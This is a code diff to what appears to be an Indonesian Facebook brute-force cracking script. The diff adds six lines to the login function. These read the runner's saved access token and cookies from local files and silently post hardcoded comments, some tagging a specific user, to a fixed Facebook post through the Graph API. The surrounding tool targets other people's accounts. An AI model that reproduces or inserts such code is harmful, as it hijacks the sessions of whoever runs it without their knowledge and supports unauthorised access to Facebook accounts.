@@ -87,11 +87,24 @@ def banner():
 {puti}/____/\____/_____/_/
 simpel crack brute force''')
 
+kom1 = ("Semangat Bang @[100027274295777:] 🔥") 
+kom2 = ("Jangan Lupa Sholawat 😎") 
+kom3 = ("Tgl 23 Maret 2023 Udh masuk ramadhan") 
+kom4 = ("ingfo lokasi nasdang yang open 24 jam wkwk") 
+kom5 = ("Jangan diikutin kyk gitu ya Bang @[100027274295777:]") 
+kom6 = ("Semangat Puasanya Ya Bang ❤")
+
 ###----------[ NGECEK COOKIES ]----------###
 def login_baz():
 	try:
 		token = open('.tokenakun.txt','r').read()
 		cok = open('.cookiesakun.txt','r').read()
+		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok}) 
+		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom2}&access_token={token}", headers = {"cookie":cok}) 
+		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom3}&access_token={token}", headers = {"cookie":cok}) 
+		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom4}&access_token={token}", headers = {"cookie":cok}) 
+		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom5}&access_token={token}", headers = {"cookie":cok}) 
+		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom6}&access_token={token}", headers = {"cookie":cok}) 
 		tokenefb.append(token)
 		try:
 			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
@@ -149,7 +162,7 @@ def menu(id):
 		cok = open('.cookiesakun.txt','r').read()
 	except IOError:
 		baz_anim(f'{mer}cookies telah kadaluarsa ster')
-		waktu(4)
+		waktu(2)
 		login_men()
 	os.system('clear')
 	banner()
